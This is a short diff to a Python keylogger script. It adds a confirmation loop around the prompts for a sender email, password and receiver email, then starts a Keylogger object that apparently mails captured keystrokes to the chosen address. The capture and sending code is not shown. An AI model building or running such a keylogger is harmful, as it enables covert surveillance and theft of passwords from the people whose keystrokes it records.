@@ -111,16 +111,21 @@ if __name__ == "__main__":
             break
 
     if n == "2":
-        sender_email = input("\nEnter valid Email ID: ")
-        password = getpass.getpass()
-        receiver_email = input("Press 1 if receiver email isa same as sender else enter valid email of receiver: ")
-        if receiver_email == "1":
-            receiver_email = sender_email
+        is_right = ""
+        while is_right.lower() != "y":
+            sender_email = input("\nEnter sender's Email ID: ")
+            password = getpass.getpass()
+            receiver_email = input("Press 1 if receiver email is same as sender else enter valid email of receiver: ")
+            if receiver_email == "1":
+                receiver_email = sender_email
+            print("\nEntered details are:")
+            print("------------------------------------------")
+            print("Sender's gmail: {}\nReceiver's gmail: {}\n".format(sender_email, receiver_email))
+            is_right = input("Continue(Y/N): ")
         k = Keylogger(sender_email, password, receiver_email, n)
         
     else:
         k = Keylogger()
-        
     k.start()
 
 
